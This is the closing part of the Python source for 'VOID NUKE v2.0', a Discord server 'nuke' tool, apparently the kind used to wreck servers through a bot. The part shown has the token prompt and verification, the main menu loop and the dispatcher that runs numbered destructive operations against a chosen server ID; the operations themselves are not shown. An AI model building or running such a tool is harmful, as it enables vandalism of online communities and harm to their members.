async def _dispatch(choice: str, guild_id: str | None) -> str | None:
    """Run one nuke operation. Always returns (possibly updated) guild_id."""
    entry = OPERATIONS.get(choice)
    if not entry:
        _fail(f"Unknown option: {choice!r}"); return guild_id

    key, label, needs_gid, needs_extra, extra_prompt, color, handler = entry

    # Resolve guild_id if op needs it
    gid = guild_id
    if needs_gid and not gid:
        try:
            gid = input("  Server ID: ").strip()
        except (EOFError, KeyboardInterrupt):
            _warn("Cancelled."); return guild_id
        if not gid:
            _warn("No server ID entered, cancelled."); return guild_id
        guild_id = gid   # persist for this session

    # Resolve extra arg if op needs it
    extra = None
    if needs_extra and extra_prompt:
        try:
            extra = input(f"  {extra_prompt}").strip() or None
        except (EOFError, KeyboardInterrupt):
            extra = None

    ST.reset()
    console.print()
    _sep(RED)
    console.print(f"  [{color}]{label.upper()}[/]")
    _sep(RED)
    console.print()

    t0 = time.time()
    try:
        await handler(gid, extra)
    except KeyboardInterrupt:
        console.print()
        _warn("Stopped by user.")
    except Exception as e:
        _fail(f"Unexpected error: {type(e).__name__}: {e}")

    ela = time.time() - t0
    console.print()
    _sep("dim")
    console.print(f"  [dim]Operation:[/] [bold white]{label}[/]  "
                  f"[dim]│  Duration:[/] [white]{ela:.2f}s[/]  "
                  f"[dim]│  Done:[/] [{GREEN}]{ST.done:,}[/]  "
                  f"[dim]│  Failed:[/] [{RED}]{ST.failed:,}[/]")
    _sep("dim")

    return guild_id

# ═══════════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════════
async def _prompt_and_verify() -> tuple[bool, dict | str]:
    """
    Interactively prompt for a token until it works, or the user quits.
    Always opens a fresh session before each attempt so stale connections
    never cause false negatives.
    """
    while True:
        console.print()
        console.print("  [dim]Paste your bot token below.[/]")
        console.print("  [dim](Get it from discord.com/developers → Your App → Bot → Reset Token)[/]")
        console.print()
        try:
            raw = input("  Token: ").strip()
        except (EOFError, KeyboardInterrupt):
            return False, "Cancelled."
        if not raw:
            _warn("No token entered."); continue

        _set_token(raw)
        _status("Opening fresh connection…")
        await _fresh_session()
        _status("Verifying…")
        ok, result = await verify_token_verbose()
        if ok:
            _save_token()
            return True, result
        _fail(str(result))
        console.print()
        try:
            again = input("  Try a different token? [Y/n]: ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            return False, "Cancelled."
        if again == "n":
            return False, "Aborted by user."

async def main():
    global _SESSION

    # ── Splash ───────────────────────────────────────────────────────────────
    console.clear()
    fig = pyfiglet.figlet_format("VOID  NUKE", font="doom")
    shades = ["bright_red","red","bright_red","red","bright_red","red"]
    for i, line in enumerate(fig.splitlines()):
        if line.strip():
            console.print(f"  [{shades[i%len(shades)]}]{line}[/]")
    console.print()
    _sep(RED)
    console.print(f"  [dim]VOID NUKE v2.0  ·  Red Team Terminal  ·  Authorized Use Only[/]")
    _sep(RED)
    console.print()

    # ── Token: load saved → verify → prompt if needed ────────────────────────
    await _fresh_session()   # always start with a clean session

    have_saved = _load_token()
    ok = False
    me_or_err: dict | str = {}

    if have_saved:
        _status(f"Loaded saved token from {TOKEN_FILE} — verifying…")
        ok, me_or_err = await verify_token_verbose()
        if not ok:
            _fail(str(me_or_err))
            console.print()
            console.print(f"  [dim]Saved token in [bold]{TOKEN_FILE}[/bold] is no longer valid.[/]")
            console.print("  [dim]This usually means you reset the token in the Discord Developer Portal.[/]")
            console.print("  [dim]Enter your new token below:[/]")

    if not ok:
        ok, me_or_err = await _prompt_and_verify()
        if not ok:
            _fail(str(me_or_err))
            try: await _SESSION.close()
            except Exception: pass
            sys.exit(1)

    me      = me_or_err
    me_name = me.get("username", "Unknown")
    me_id   = me.get("id", "")

    _ok(f"Logged in as  {me_name}  ({me_id})")
    await asyncio.sleep(0.8)

    guild_id: str | None = None

    try:
        while True:
            # Always redraw the full menu at the top of each loop
            _menu(me_name, me_id, guild_id)

            try:
                raw = input("  Choice: ").strip()
            except (EOFError, KeyboardInterrupt):
                break

            raw = raw.strip()

            if raw == "0":
                break

            # S — set / change server ID
            if raw.upper() == "S":
                try:
                    gid = input("  Server ID: ").strip()
                    if gid:
                        guild_id = gid
                        _ok(f"Active server set to {guild_id}")
                    else:
                        _warn("No ID entered — server unchanged.")
                except (EOFError, KeyboardInterrupt):
                    pass
                try:
                    input("\n  Press Enter to return to the menu…")
                except (EOFError, KeyboardInterrupt):
                    break
                continue

            # R — reload bot / re-auth
            if raw.upper() == "R":
                console.print()
                _sep(RED)
                console.print(f"  [{TEAL}]RELOAD BOT[/]")
                _sep(RED)
                console.print()
                guild_id = await op_reload_bot(guild_id)
                console.print()
                try:
                    input("  Press Enter to return to the menu…")
                except (EOFError, KeyboardInterrupt):
                    break
                continue

            # Normalise zero-padded input (01 → 1)
            norm = raw.lstrip("0") or "0"
            if raw not in OPERATIONS and norm not in OPERATIONS:
                _fail(f"Unknown option: {raw!r} — enter 1-21, S, R, or 0")
                await asyncio.sleep(0.5)
                continue

            # ── Run the chosen operation ──────────────────────────────────────
            guild_id = await _dispatch(raw if raw in OPERATIONS else norm, guild_id)

            # ── Always return to menu ─────────────────────────────────────────
            console.print()
            try:
                input("  Press Enter to return to the menu…")
            except (EOFError, KeyboardInterrupt):
                break

    finally:
        try: await _SESSION.close()
        except Exception: pass

    console.print()
    _sep(RED)
    console.print(f"  [{GREEN}]✓  VOID NUKE exited cleanly[/]")
    _sep(RED)
    console.print()


def run():
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        console.print()
        console.print(f"  [dim red]Aborted.[/]")
        console.print()
        w = console.size.width
        console.print(f"  [red]{'◈' * (w - 4)}[/]")
        console.print(f"  [green]  ✓  VOID NUKE exited cleanly[/]")
        console.print(f"  [red]{'◈' * (w - 4)}[/]")
        console.print()
        console.print("  Press Enter to return to the menu…", end="")

if __name__ == "__main__":
    run()
